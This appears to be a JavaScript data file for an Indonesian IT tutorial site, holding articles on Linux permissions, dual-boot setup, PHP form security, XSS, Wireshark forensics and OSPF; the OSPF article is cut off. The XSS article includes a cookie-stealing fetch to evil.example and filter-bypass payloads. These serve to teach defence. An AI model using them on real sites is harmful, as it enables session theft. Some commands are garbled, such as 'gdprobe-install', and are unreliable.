          "# lihat umask saat ini\numask\n# 0022 (default user)\n# 0002 (default root di beberapa distro)\n\n# cara hitung: izin maksimal MINUS umask\n# file      : maksimal 666  -> umask 022 = 644 (rw-r--r--)\n# direktori : maksimal 777  -> umask 022 = 755 (rwxr-xr-x)\n\n# ubah umask (mis. agar file pribadi hanya terbaca owner)\numask 077\n# file baru -> 600, direktori baru -> 700\n\n# buat permanen: tambah ke ~/.bashrc atau /etc/profile\n# umask 022"
        ) +
        '<table><thead><tr><th>umask</th><th>File baru</th><th>Dir baru</th><th>Untuk</th></tr></thead><tbody>' +
        "<tr><td>022</td><td>644</td><td>755</td><td>Default umum</td></tr>" +
        "<tr><td>002</td><td>664</td><td>775</td><td>Grup kolaborasi</td></tr>" +
        "<tr><td>077</td><td>600</td><td>700</td><td>Kunci &amp; data sensitif</td></tr>" +
        "</tbody></table>" +
        '<h2 id="special">5. Special Bits: SUID, SGID, Sticky</h2>' +
        codeBlock(
          "bash",
          "# SUID (4) : file dijalankan sebagai PEMILIK file\nchmod u+s /usr/bin/passwd\n# atau oktal:\nchmod 4755 /usr/bin/passwd\n\n# SGID (2) : file dijalankan sebagai grup, direktori baru ikut grup\nchmod g+s /srv/shared\nchmod 2775 /srv/shared\n\n# Sticky (1) : di direktori, hanya pemilik file yg boleh menghapus\nchmod +t /tmp\nchmod 1777 /tmp\n\n# verifikasi: huruf kecil untuk eksekusi, besar untuk special\nls -l /tmp\n# drwxrwxrwt  -> t di ujung = sticky bit aktif\n\n# cek angka numerik (4 digit)\nstat -c '%A %a %n' /usr/bin/passwd\n# -rwsr-xr-x 4755 /usr/bin/passwd"
        ) +
        '<h2 id="sticky-use">6. Penerapan Sticky Bit pada Direktori Bersama</h2>' +
        codeBlock(
          "bash",
          "# buat direktori kolaborasi tim\nsudo mkdir -p /srv/project-tim\nsudo chgrp developers /srv/project-tim\nsudo chmod 2775 /srv/project-tim   # SGID + rwxrwsr-x\n\n# penjelasan 2775:\n#   2 = SGID        -> file baru otomatis milik grup 'developers'\n#   7 = owner rwx\n#   7 = group rwx\n#   5 = other r-x\n\n# tambah sticky agar anggota tidak bisa menghapus file orang lain\nsudo chmod +t /srv/project-tim\nls -ld /srv/project-tim\n# drwxrwsrwt -> t di ujung = sticky aktif"
        ) +
        '<h2 id="acl">7. ACL: Izin Lebih Granular</h2>' +
        codeBlock(
          "bash",
          "# saat umum/group tidak cukup, gunakan ACL\nsudo apt install acl -y\n\n# izinkan user tertentu menulis, tanpa membuka ke seluruh group\nsudo setfacl -m u:bob:rw /srv/shared/data.csv\n\n# lihat ACL\ng\ngetfacl /srv/shared/data.csv\n# user::rw-\n# user:bob:rw-\n# group::r--\n# mask::rw-\n# other::r--\n\n# default ACL untuk semua file baru di direktori\nsudo setfacl -d -m g:developers:rw /srv/shared"
        ) +
        '<h2 id="diagnosa">8. Diagnosa Masalah Permission</h2>' +
        codeBlock(
          "bash",
          "# cek izin aktual + owner\nls -l /path\nstat -c '%A %U:%G' /path\n\n# pantau siapa yang membuat file (audit)\nsudo auditctl -w /srv/shared -p wa -a shared_files\n\n# sering: web 403 karena direktori kehilangan bit x\nnamei -l /var/www/html/index.php\n# jika salah satu level tidak punya x, proses berhenti di situ"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Permission Linux berdiri di tiga lapis: <strong>permission dasar (rwx)</strong>, <strong>umask</strong> (izin default pembuatan), dan <strong>special bits</strong> (SUID/SGID/sticky). Untuk direktori bersama, kombinasi <code>2775 + sticky</code> adalah pola paling aman agar kolaborasi tetap terjaga tanpa risiko file saling terhapus.</p>" +
        "<p>Referensi cepat angka permission:</p>" +
        "<ol>" +
        "<li><code>755</code> — owner rwx, group &amp; other r-x (executable bersama)</li>" +
        "<li><code>644</code> — owner rw-, group &amp; other r-- (file biasa)</li>" +
        "<li><code>600</code> — hanya owner rw- (file rahasia, mis. kunci SSH)</li>" +
        "<li><code>2775</code> — setgid direktori + rwxs (file baru ikut group)</li>" +
        "<li><code>1777</code> — sticky bit (hanya pemilik file yang boleh menghapus)</li>" +
        "</ol>" +
        callout(
          "tip",
          "Untuk menemukan file SUID di sistem (penting saat audit keamanan): <code>find / -perm -4000 -type f 2&gt;/dev/null</code> — hasilnya berguna mengecek apakah ada binary berbahaya yang tertinggal.",
          "TIPS"
        ),
    },

    "installing-os-linux-windows": {
      id: "installing-os-linux-windows",
      crumb: "Persiapan Partisi & Bootloader",
      title: "Dual Boot Linux & Windows: Persiapan Partisi & Bootloader",
      category: "itsupport",
      difficulty: "Intermediate",
      excerpt:
        "Checklist aman sebelum instalasi dual boot: skema partisi GPT/UEFI, urutan instalasi, dan perbaikan GRUB yang hilang.",
      date: "2026-08-29",
      readTime: 12,
      lab: "PC UEFI + Disk GPT",
      author: "Admin KBHub",
      tags: ["dual-boot", "grub", "partition", "installation"],
      content:
        callout(
          "warning",
          "Selalu <strong>backup data penting</strong> sebelum mempartisi. Artikel ini fokus pada <strong>persiapan partisi, skema GPT/UEFI, dan bootloader</strong>. Untuk panduan instalasi langkah demi langkah dari sudut pandang pemula, baca <a href='article.html?id=itsupport-windows-reinstall-dualboot' class='text-emerald-400 underline'>Dual Boot Windows 11 &amp; Linux</a>.",
          "PERINGATAN"
        ) +
        '<h2 id="gpt-mbr">1. GPT vs MBR: Tentukan Dulu</h2>' +
        '<table><thead><tr><th>Aspek</th><th>MBR (Legacy)</th><th>GPT (UEFI)</th></tr></thead><tbody>' +
        "<tr><td>Partisi maks</td><td>4 (utama)</td><td>Praktis tak terbatas</td></tr>" +
        "<tr><td>Ukuran disk</td><td>Maks 2 TB</td><td>Sampai 9 ZB</td></tr>" +
        "<tr><td>Boot mode</td><td>Legacy/CSM</td><td>UEFI</td></tr>" +
        "<tr><td>Partisi khusus</td><td>1 active</td><td>EFI System Partition</td></tr>" +
        "</tbody></table>" +
        callout(
          "warning",
          "Windows 11 hanya mendukung <strong>UEFI + GPT + Secure Boot + TPM 2.0</strong>. Untuk dual boot Windows 11, tidak ada pilihan selain GPT. Konversi MBR→GPT berisiko — pastikan sudah backup dan pahami konsekuensinya."
        ) +
        '<h2 id="skema">2. Skema Partisi yang Disarankan</h2>' +
        codeBlock(
          "bash",
          "# contoh layout dual boot pada SSD 512 GB (GPT/UEFI)\n# ------------------------------------------------------------\n# partisi 1 : EFI System Partition (ESP)   260 MB   fat32\n#             dipakai BERSAMA Windows & Linux (bootloader)\n# partisi 2 : Microsoft Reserved (MSR)      16 MB    -\n# partisi 3 : Windows (C:)                  200 GB   ntfs\n# partisi 4 : Linux swap                    8 GB     linux-swap\n# partisi 5 : Linux root (/)                100 GB   ext4\n# partisi 6 : Linux home (/home)            sisa GB  ext4\n# ------------------------------------------------------------\n# catatan: /home dipisah agar data selamat saat reinstal Linux"
        ) +
        codeBlock(
          "bash",
          "# periksa skema disk saat ini (dari Windows PowerShell)\ndiskpart\n  list disk\n  # kolom GPT: '*' berarti GPT, kosong berarti MBR\n  exit\n\n# dari Linux, cek partisi & tipe\nsudo fdisk -l\nlsblk -f\nsudo gdisk -l /dev/sda        # detail GPT"
        ) +
        '<h2 id="urutan">3. Urutan Instalasi yang Benar</h2>' +
        "<ol>" +
        "<li><strong>Windows dulu</strong> (bila belum terpasang) — ia membuat partisi ESP sendiri</li>" +
        "<li>Shrink volume Windows melalui <code>diskmgmt.msc</code>, sisakan ruang unallocated</li>" +
        "<li><strong>Linux kemudian</strong> — installer menambah entri boot ke ESP yang sudah ada</li>" +
        "</ol>" +
        callout(
          "note",
          "Jika dibalik (Linux dulu, lalu Windows), Windows akan menimpa bootloader dan Linux hilang dari menu. Perbaikannya harus ulang pasang GRUB — lihat bagian 5."
        ) +
        '<h2 id="partisi-linux">4. Partisi Linux (Manual)</h2>' +
        codeBlock(
          "bash",
          "# saat installer Linux, pilih 'Something else' / manual\n# sisa ruang unallocated -> buat partisi:\n#\n#   swap        : 8192 MB   tipe 'linux swap'\n#   / (root)    : 102400 MB tipe ext4, mount point /\n#   /home       : sisa      tipe ext4, mount point /home\n#\n# pastikan partisi ESP (fat32, 260 MB) dipilih sebagai\n# 'Device for boot loader installation' atau mount di /boot/efi"
        ) +
        '<h2 id="fstab">5. fstab &amp; Mount Point</h2>' +
        codeBlock(
          "bash",
          "# verifikasi /etc/fstab agar boot tidak gagal\nsudo blkid\n# /dev/sda5: UUID=\"a1b2...\" TYPE=\"ext4\"\n# /dev/sda4: UUID=\"c3d4...\" TYPE=\"swap\"\n\nsudo nano /etc/fstab\n# UUID=a1b2...  /      ext4  errors=remount-ro  0 1\n# UUID=c3d4...  none   swap  sw                  0 0\n# UUID=e5f6...  /home  ext4  defaults            0 2\n\n# uji sebelum reboot — GAGAL di sini = tidak bisa boot\nsudo mount -a\n# jika tanpa error, fstab aman"
        ) +
        callout(
          "warning",
          "Selalu uji <code>sudo mount -a</code> sebelum reboot. Salah menulis UUID di fstab bisa membuat sistem berhenti di <em>emergency mode</em> saat boot berikutnya."
        ) +
        '<h2 id="grub-hilang">6. GRUB Hilang (Tertimpa Windows)</h2>' +
        codeBlock(
          "bash",
          "# boot dari Live USB, lalu:\nsudo mount /dev/sda5 /mnt          # root Linux\nsudo mount /dev/sda1 /mnt/boot/efi # partisi ESP\nsudo mount --bind /dev  /mnt/dev\nsudo mount --bind /proc /mnt/proc\nsudo mount --bind /sys  /mnt/sys\nsudo chroot /mnt\n\n# pasang ulang GRUB ke EFI\ngdprobe-install --target=x86_64-efi \\\n  --efi-directory=/boot/efi --bootloader-id=UBUNTU\n\nupdate-grub\nexit && sudo reboot"
        ) +
        '<h2 id="checklist">7. Checklist Pra-Instalasi</h2>' +
        "<ul>" +
        "<li>Backup data penting ke media terpisah</li>" +
        "<li>Matikan <strong>Fast Startup</strong> di Windows (mengunci partisi NTFS)</li>" +
        "<li>Siapkan USB bootable &amp; pastikan tahu tombol boot menu</li>" +
        "<li>Cek skema disk (GPT vs MBR) — sesuaikan dengan target boot mode</li>" +
        "<li>Nonaktifkan <strong>Secure Boot</strong> sementara bila distro belum didukung</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Kunci dual boot yang bersih: <strong>gunakan GPT/UEFI</strong>, <strong>pisahkan partisi Windows dan Linux dengan jelas</strong>, <strong>sisakan ESP bersama</strong>, dan selalu <strong>uji <code>mount -a</code> sebelum reboot</strong>. Dengan persiapan ini, instalasi dual boot menjadi proses yang dapat diprediksi dan mudah dipulihkan.</p>" +
        callout(
          "tip",
          "Simpan <strong>UUID</strong> tiap partisi di catatan. UUID tidak berubah meski urutan disk berganti — jauh lebih andal daripada <code>/dev/sda1</code> yang bisa berpindah.",
          "TIPS"
        ),
    },

    "php-form-validation": {
      id: "php-form-validation",
      crumb: "Form Validation Aman PHP",
      title: "Form Validation Aman dengan PHP Native (Tanpa Framework)",
      category: "webdev",
      difficulty: "Intermediate",
      excerpt:
        "Validasi sisi server yang benar: sanitasi input, prepared statements anti-SQLi, CSRF token, dan pesan error yang informatif.",
      date: "2026-08-26",
      readTime: 13,
      lab: "XAMPP / PHP 8.2",
      author: "Admin KBHub",
      tags: ["php", "validation", "security", "forms"],
      content:
        callout(
          "warning",
          "Prinsip utama: <strong>validasi sisi server tidak bisa dihindari</strong>. Validasi di JavaScript hanya untuk kenyamanan pengguna — penyerang bisa melewatkannya dengan mudah. Selalu ulangi validasi di PHP.",
          "PERINGATAN"
        ) +
        '<h2 id="prinsip">1. Prinsip Validasi yang Benar</h2>' +
        "<ul>" +
        "<li><strong>Whitelist, bukan blacklist</strong> — izinkan yang dikenal, blokir sisanya</li>" +
        "<li><strong>Jangan percaya input</strong> — semua <code>$_POST</code>/<code>$_GET</code> bisa dimanipulasi</li>" +
        "<li><strong>Pisahkan</strong> validasi, sanitasi, dan kesalahan</li>" +
        "<li><strong>Escape saat output</strong> — bukan saat input</li>" +
        "</ul>" +
        '<h2 id="struktur">2. Struktur Form &amp; CSRF Token</h2>' +
        codeBlock(
          "php",
          "<?php\nsession_start();\n\n// buat token CSRF sekali per session\nif (empty($_SESSION['csrf'])) {\n    $_SESSION['csrf'] = bin2hex(random_bytes(32));\n}\n?>\n<form method=\"post\" action=\"proses.php\">\n  <input type=\"hidden\" name=\"csrf\"\n         value=\"<?= htmlspecialchars($_SESSION['csrf']) ?>\">\n\n  <label>Email: <input type=\"email\" name=\"email\"></label><br>\n  <label>Usia:  <input type=\"number\" name=\"usia\"></label><br>\n  <button type=\"submit\">Kirim</button>\n</form>"
        ) +
        '<h2 id="validasi">3. Validasi Sisi Server</h2>' +
        codeBlock(
          "php",
          "<?php\n// proses.php\nsession_start();\n$errors = [];\n$clean  = [];\n\n// 1) cek CSRF\nif (!hash_equals($_SESSION['csrf'] ?? '', $_POST['csrf'] ?? '')) {\n    die('Token CSRF tidak valid.');\n}\n\n// 2) email — validasi ketat\n$email = filter_var(trim($_POST['email'] ?? ''), FILTER_VALIDATE_EMAIL);\nif ($email === false) {\n    $errors[] = 'Email tidak valid.';\n} else {\n    $clean['email'] = $email;\n}\n\n// 3) usia — harus angka dalam rentang wajar\n$usia = filter_var($_POST['usia'] ?? 0, FILTER_VALIDATE_INT,\n                   ['options' => ['min_range' => 1, 'max_range' => 120]]);\nif ($usia === false) {\n    $errors[] = 'Usia harus angka 1-120.';\n} else {\n    $clean['usia'] = $usia;\n}\n\n// 4) jika ada error, kembali ke form\nif ($errors) {\n    $_SESSION['errors'] = $errors;\n    $_SESSION['old']    = ['email' => $_POST['email'] ?? ''];\n    header('Location: form.php');\n    exit;\n}\n\n// lolos semua — lanjut proses (mis. simpan ke DB)\n"
        ) +
        '<h2 id="sanitize">4. Fungsi Sanitasi Bawaan PHP</h2>' +
        codeBlock(
          "php",
          "<?php\n// FILTER_ untuk berbagai kebutuhan\n$angka   = filter_var($input, FILTER_VALIDATE_INT);\n$desimal = filter_var($input, FILTER_VALIDATE_FLOAT);\n$url     = filter_var($input, FILTER_VALIDATE_URL);\n$ip      = filter_var($input, FILTER_VALIDATE_IP);\n\n// hapus semua tag HTML (jika memang butuh teks polos)\n$nama = strip_tags(trim($_POST['nama'] ?? ''));\n\n// panjang minimum — cegah input kosong/terlalu pendek\nif (mb_strlen($nama) < 2 || mb_strlen($nama) > 100) {\n    $errors[] = 'Nama harus 2-100 karakter.';\n}\n\n// whitelist karakter untuk username\nif (!preg_match('/^[a-z0-9_]{3,20}$/', $_POST['username'] ?? '')) {\n    $errors[] = 'Username hanya boleh huruf kecil, angka, underscore.';\n}"
        ) +
        '<h2 id="prepared">5. Simpan dengan Prepared Statement</h2>' +
        codeBlock(
          "php",
          "<?php\n$pdo = new PDO('mysql:host=localhost;dbname=app;charset=utf8mb4',\n                'user', 'pass',\n                [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);\n\n$stmt = $pdo->prepare(\n    'INSERT INTO pendaftar (email, usia, dibuat) VALUES (?, ?, NOW())'\n);\n$stmt->execute([$clean['email'], $clean['usia']]);\n\n// JANGAN pernah begini (raw concatenation = SQL Injection):\n// $pdo->query(\"INSERT INTO pendaftar (email) VALUES ('\" . $_POST['email'] . \"')\");"
        ) +
        callout(
          "warning",
          "Prepared statements dengan <strong>parameter binding</strong> adalah pertahanan utama anti-SQL Injection. Jangan menggabungkan variabel langsung ke string SQL, apa pun alasannya."
        ) +
        '<h2 id="error">6. Menampilkan Error &amp; Escape Output</h2>' +
        codeBlock(
          "php",
          "<?php\n// tampilkan error dengan aman (escape saat output)\nif (!empty($_SESSION['errors'])):\n  echo '<ul style=\"color:red\">';\n  foreach ($_SESSION['errors'] as $e) {\n    echo '<li>' . htmlspecialchars($e, ENT_QUOTES, 'UTF-8') . '</li>';\n  }\n  echo '</ul>';\n  unset($_SESSION['errors']);\nendif;\n\n// isi form lama (old input) juga harus di-escape\n$val = htmlspecialchars($_SESSION['old']['email'] ?? '', ENT_QUOTES);\necho \"<input type='email' name='email' value='$val'>\";"
        ) +
        '<h2 id="server-side">7. Validasi Server-Side Lengkap (Contoh Nyata)</h2>' +
        codeBlock(
          "php",
          "<?php\nfunction validate(array $post): array {\n    $e = [];\n\n    if (!preg_match('/^[A-Za-z ]{2,60}$/', trim($post['nama'] ?? '')))\n        $e[] = 'Nama hanya huruf dan spasi (2-60 huruf).';\n\n    if (!filter_var($post['email'] ?? '', FILTER_VALIDATE_EMAIL))\n        $e[] = 'Format email salah.';\n\n    if (!preg_match('/^(08|\\+628)[0-9]{7,13}$/', $post['telp'] ?? ''))\n        $e[] = 'Nomor HP harus diawali 08 atau +628.';\n\n    if (!isset($post['setuju']))\n        $e[] = 'Anda harus menyetujui syarat & ketentuan.';\n\n    return $e;\n}\n\n$errors = validate($_POST);\nif ($errors) {\n    // render ulang form + error\n} else {\n    // simpan (dengan prepared statement)\n}"
        ) +
        '<h2 id="checklist">8. Checklist Keamanan Form</h2>' +
        '<table><thead><tr><th>ancaman</th><th>solusi</th></tr></thead><tbody>' +
        "<tr><td>SQL Injection</td><td>Prepared statements (PDO/mysqli)</td></tr>" +
        "<tr><td>XSS</td><td><code>htmlspecialchars()</code> saat output</td></tr>" +
        "<tr><td>CSRF</td><td>Token acak per session + <code>hash_equals</code></td></tr>" +
        "<tr><td>Mass assignment</td><td>Whitelist field yang boleh diproses</td></tr>" +
        "<tr><td>Upload sembarangan</td><td>Validasi MIME, ekstensi, dan isi file</td></tr>" +
        "</tbody></table>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Form yang aman dibangun dari kebiasaan: <strong>whitelist input</strong>, <strong>prepared statements</strong>, <strong>CSRF token</strong>, dan <strong>escape saat output</strong>. Keempat langkah ini mencegah mayoritas serangan umum pada aplikasi berbasis form tanpa perlu framework.</p>" +
        callout(
          "tip",
          "Naik level setelah paham konsep ini: gunakan <strong>Laravel</strong> atau <strong>CodeIgniter</strong> yang validasi &amp; escaping-nya sudah built-in — tapi tetap penting memahami apa yang terjadi di balik layar agar kamu tahu kapan harus mengustomisasi.",
          "TIPS"
        ),
    },

    "web-exploitation-xss": {
      id: "web-exploitation-xss",
      crumb: "Celah XSS",
      title: "Web Exploitation: Memahami Celah XSS (Stored & Reflected)",
      category: "cybersecurity",
      difficulty: "Intermediate",
      excerpt:
        "Mengenal Cross-Site Scripting: perbedaan Reflected dan Stored XSS, cara mendeteksi, bypass filter dasar, hingga pencegahan dengan escaping & CSP.",
      date: "2026-10-11",
      readTime: 12,
      lab: "DVWA / PortSwigger Web Security Academy",
      author: "Admin KBHub",
      tags: ["xss", "web-exploitation", "security", "bug-bounty"],
      content:
        callout(
          "warning",
          "Semua contoh di artikel ini <strong>hanya untuk lab milik sendiri atau target yang terautorasi</strong>. Menguji XSS pada sistem orang lain tanpa izin melanggar hukum dan bisa dikenai sanksi hukum.",
          "PERINGATAN ETIKA"
        ) +
        '<h2 id="konsep-xss">1. Apa itu XSS?</h2>' +
        "<p><strong>XSS (Cross-Site Scripting)</strong> terjadi ketika aplikasi menampilkan input pengguna ke halaman tanpa di-escape, sehingga browser memperlakukannya sebagai kode JavaScript — bukan teks biasa. Dampaknya: pencurian cookie/session, perubahan tampilan halaman, hingga menjalankan aksi atas nama korban.</p>" +
        '<h2 id="jenis">2. Tiga Jenis XSS</h2>' +
        '<table><thead><tr><th>Jenis</th><th>Penyimpanan</th><th>Korban</th></tr></thead><tbody>' +
        "<tr><td>Reflected</td><td>Tidak disimpan (parameter URL/form)</td><td>Harus klik link berbahaya</td></tr>" +
        "<tr><td>Stored</td><td>Disimpan di DB (komentar/profil)</td><td>Semua pengunjung otomatis</td></tr>" +
        "<tr><td>DOM-based</td><td>Tidak lewat server (JS memanipulasi DOM)</td><td>Sebagaimana reflected</td></tr>" +
        "</tbody></table>" +
        '<h2 id="reflected">3. Reflected XSS</h2>' +
        "<p>Payload dipantulkan langsung oleh server pada respons, biasanya lewat parameter URL.</p>" +
        codeBlock(
          "bash",
          "# contoh parameter rentan\nhttp://localhost:8000/search?q=<script>alert(1)</script>\n\n# server menaruh nilai q apa adanya ke halaman hasil\n# -> skrip dieksekusi di browser korban"
        ) +
        '<h2 id="stored">4. Stored XSS</h2>' +
        "<p>Payload disimpan di database (komentar, profil, pesan) lalu ditampilkan ke setiap pengunjung. Lebih berbahaya karena tidak butuh link khusus.</p>" +
        codeBlock(
          "html",
          "<!-- komentar berbahaya yang disimpan ke DB -->\n<script>\n  fetch('https://evil.example/steal?c=' + document.cookie)\n</script>\n\n<!-- aplikasi menampilkan komentar apa adanya -->\n<div class=\"komentar\">\n  <script> fetch(...) </script>   <!-- ikut dieksekusi -->\n</div>"
        ) +
        callout(
          "note",
          "Stored XSS sering ditemukan pada kolom komentar, nama profil, dan pesan internal. Karena dampaknya menyebar ke banyak korban, temuan ini biasanya bernilai lebih tinggi di program bug bounty."
        ) +
        '<h2 id="deteksi">5. Cara Mendeteksi</h2>' +
        codeBlock(
          "bash",
          "# payload deteksi dasar — cari pantulan tanpa sanitasi\n\"><script>alert(1)</script>\n'><img src=x onerror=alert(1)>\njavascript:alert(1)\n\n# tandanya XSS ada bila muncul popup/alert\n# perhatikan juga refleksi di source (Ctrl+U)\n# apakah tagmu muncul utuh atau sudah di-encode"
        ) +
        '<h2 id="bypass">6. Bypass Filter Sederhana</h2>' +
        "<p>Bila tag <code>&lt;script&gt;</code> diblokir, masih banyak alternatif payload:</p>" +
        codeBlock(
          "html",
          "<!-- tanpa script tag -->\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\n\n<!-- variasi huruf besar / spasi -->\n<ScRiPt>alert(1)</sCrIpT>\n<img/src=x onerror=alert(1)>\n\n<!-- event handler lain -->\n<details open ontoggle=alert(1)>"
        ) +
        '<h2 id="pencegahan">7. Pencegahan (untuk Developer)</h2>' +
        codeBlock(
          "php",
          "<?php\n// SELALU escape saat output — bukan saat input\necho htmlspecialchars($komentar, ENT_QUOTES, 'UTF-8');\n\n// untuk konten HTML dari admin tepercaya, pakai allowlist sanitizer\n// (mis. HTML Purifier) — jangan whitelist tag secara manual)\n?>"
        ) +
        codeBlock(
          "bash",
          "# aktifkan Content-Security-Policy sebagai lapisan pertahanan tambahan\n# (header HTTP)\nContent-Security-Policy: default-src 'self'; script-src 'self'\n\n# efek: skrip inline & eksternal asing diblokir browser"
        ) +
        "<ul>" +
        "<li><strong>Escape output</strong> — <code>htmlspecialchars()</code> dengan <code>ENT_QUOTES</code></li>" +
        "<li><strong>CSP header</strong> — membatasi sumber skrip yang boleh jalan</li>" +
        "<li><strong>HttpOnly cookie</strong> — menghalangi <code>document.cookie</code> membaca session</li>" +
        "<li><strong>Validasi input</strong> — whitelist karakter bila memungkinkan</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Inti XSS selalu sama: <strong>input pengguna dipercaya mentah sebagai HTML/JS</strong>. Baik Reflected, Stored, maupun DOM-based, pertahanan utamanya tetap <em>escape saat output</em> — diperkuat CSP dan cookie HttpOnly.</p>" +
        callout(
          "tip",
          "Latihan legal & gratis: selesaikan lab XSS di <strong>PortSwigger Web Security Academy</strong> — tersedia dari dasar reflected/stored hingga bypass CSP tingkat lanjut.",
          "LATIHAN"
        ),
    },

    "forensik-pcap-wireshark": {
      id: "forensik-pcap-wireshark",
      crumb: "Analisis PCAP Wireshark",
      title: "Forensik CTF: Analisis File PCAP Menggunakan Wireshark",
      category: "cybersecurity",
      difficulty: "Intermediate",
      excerpt:
        "Panduan analisis trafik jaringan: membaca capture PCAP, display filter HTTP/DNS/Data, mengikuti stream, hingga mengekstrak file dan kredensial.",
      date: "2026-10-10",
      readTime: 13,
      lab: "Wireshark 4.x + tshark",
      author: "Admin KBHub",
      tags: ["forensics", "wireshark", "pcap", "ctf"],
      content:
        callout(
          "note",
          "Soal forensik jaringan di CTF hampir selalu menyediakan file <strong>.pcap / .pcapng</strong>. Kemampuan membaca capture adalah skill inti — sama pentingnya dengan kemampuan eksploitasi."
        ) +
        '<h2 id="konsep">1. Konsep &amp; Persiapan</h2>' +
        "<p><strong>PCAP</strong> adalah rekaman paket jaringan. Wireshark membukanya dengan GUI, sedangkan <strong>tshark</strong> versi CLI memudahkan pemrosesan otomatis dan scripting.</p>" +
        codeBlock(
          "bash",
          "# buka file capture\nwireshark capture.pcapng\n\n# alternatif CLI (untuk grep/otomasi)\ntshark -r capture.pcapng -T fields -e ip.src -e ip.dst | sort | uniq -c"
        ) +
        '<h2 id="statistik">2. Mulai dari Statistik</h2>' +
        "<p>Sebelum menyelam ke paket per paket, lihat gambaran besar:</p>" +
        "<ul>" +
        "<li><strong>Statistics → Conversations</strong> — siapa berbicara dengan siapa</li>" +
        "<li><strong>Statistics → Protocol Hierarchy</strong> — protokol apa yang mendominasi</li>" +
        "<li><strong>Statistics → Endpoints</strong> — host paling aktif</li>" +
        "</ul>" +
        '<h2 id="filter">3. Display Filter (Kunci Utama)</h2>' +
        codeBlock(
          "bash",
          "# ---- filter HTTP ----\nhttp.request                       # semua request\nhttp.request.method == \"POST\"      # hanya POST\nhttp.response.code >= 400          # respons error\nhttp.host == \"target.local\"        # filter domain tertentu\n\n# ---- filter DNS ----\ndns                                # semua query DNS\ndns.qry.name contains \"flag\"       # cari domain berisi kata kunci\n\n# ---- filter Data / payload ----\ndata                               # data transfer (bukan header)\ntcp contains \"flag{\"               # cari string di seluruh TCP\nframe contains \"password\"          # cari di frame mana pun"
        ) +
        callout(
          "note",
          "Bedakan <strong>display filter</strong> (sintaks <code>http.request</code>) dengan <strong>capture filter</strong> (sintaks <code>tcp port 80</code>). Display filter dipakai setelah file dibuka, capture filter dipakai saat merekam."
        ) +
        '<h2 id="stream">4. Follow TCP Stream</h2>' +
        "<p>Cara tercepat memahami satu sesi komunikasi lengkap (mis. login, HTTP request–respons):</p>" +
        codeBlock(
          "bash",
          "# GUI: klik kanan paket mana pun -> Follow -> TCP Stream\n# atau dari CLI:\ntshark -r capture.pcapng -q -z follow,tcp,ascii,0\n\n# opsi stream: 0,1,2,... (indeks stream TCP)\n# output: komunikasi dua arah dalam satu tampilan terbaca"
        ) +
        '<h2 id="ekstrak">5. Mengekstrak File dari PCAP</h2>' +
        "<p>Banyak soal menyembunyikan file (gambar, dokumen, flag) yang ditransfer lewat HTTP. Wireshark bisa mengekstraknya utuh:</p>" +
        codeBlock(
          "bash",
          "# GUI: File -> Export Objects -> HTTP\n#   -> pilih objek -> Save As\n\n# CLI (tshark) untuk ekstrak massal:\ntshark -r capture.pcapng --export-objects http,./out\nls -la ./out"
        ) +
        '<h2 id="kredensial">6. Menemukan Kredensial</h2>' +
        codeBlock(
          "bash",
          "# cari payload login (form/x-www-form-urlencoded)\nhttp.request.uri contains \"login\"\nhttp.file_data contains \"password\"\n\n# HTTP Basic Auth (base64) muncul di header Authorization\nhttp.authorization\n\n# dekripsi base64 (mis. dXNlcjpwYXNz)\necho -n 'dXNlcjpwYXNz' | base64 -d\n# -> user:pass"
        ) +
        '<h2 id="tls">7. Catatan TLS/HTTPS</h2>' +
        "<p>Jika capture memakai HTTPS dan kunci SSL tidak tersedia, isi payload ter-encrypt. Beberapa opsi:</p>" +
        "<ul>" +
        "<li>Cari <strong>application secrets</strong> di environment/lab yang disediakan soal</li>" +
        "<li>Fokus ke metadata yang tetap terlihat: <strong>DNS, IP, SNI, timing</strong></li>" +
        "<li>Di lab yang sah, set <code>SSLKEYLOGFILE</code> agar kunci simpan &amp; bisa dipakai Wireshark</li>" +
        "</ul>" +
        '<h2 id="alur">8. Alur Analisis yang Disarankan</h2>' +
        "<ol>" +
        "<li>Statistik dulu (conversations, protocol hierarchy)</li>" +
        "<li>Filter protokol dominan (biasanya <code>http</code> atau <code>dns</code>)</li>" +
        "<li>Follow stream pada sesi mencurigakan</li>" +
        "<li>Export objects untuk menemukan file tersembunyi</li>" +
        "<li>grep payload untuk kata kunci (<code>flag</code>, <code>password</code>, <code>admin</code>)</li>" +
        "</ol>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Analisis PCAP bukan soal membaca ribuan paket satu per satu — melainkan <strong>mempersempit dengan display filter</strong>, lalu <strong>menelusuri stream</strong> dan <strong>mengekstrak objek</strong>. Kuasai pola ini dan mayoritas soal forensik jaringan bisa diselesaikan secara sistematis.</p>" +
        callout(
          "tip",
          "Berlatihlah dengan capture dari <strong>Malware-Traffic-Analysis.net</strong> atau soal forensik jaringan di picoCTF — keduanya menyediakan PCAP nyata untuk dipraktikkan.",
          "LATIHAN"
        ),
    },

    "networking-ospf-routing": {
      id: "networking-ospf-routing",
      crumb: "Dynamic Routing OSPF",
      title: "Konfigurasi Dynamic Routing OSPF di MikroTik & Cisco",
      category: "networking",
      difficulty: "Advanced",
      excerpt:
        "Panduan OSPF dari konsep hingga konfigurasi: area & router ID, penyesuaian cost/metric, verifikasi neighbor, dan perbandingan OSPF vs routing statis.",
      date: "2026-10-09",
      readTime: 16,
      lab: "MikroTik CHR + Cisco Packet Tracer",
      author: "Admin KBHub",
      tags: ["ospf", "dynamic-routing", "mikrotik", "cisco"],
      content:
        callout(
          "note",
          "<strong>OSPF (Open Shortest Path First)</strong> adalah protokol dynamic routing link-state. Berbeda dari static routing, OSPF bertukar informasi topologi antar router secara otomatis dan menyesuaikan jalur saat ada perubahan."
        ) +
        '<h2 id="konsep">1. Konsep Dasar OSPF</h2>' +
        "<ul>" +
        "<li><strong>Area 0 (Backbone)</strong> — area pusat wajib; area lain harus terhubung ke sini</li>" +
        "<li><strong>Router ID</strong> — identifier unik tiap router (biasanya IP tertinggi)</li>" +
        "<li><strong>LSA / LSDB</strong> — router berbagi 'peta' link (link-state advertisement)</li>" +
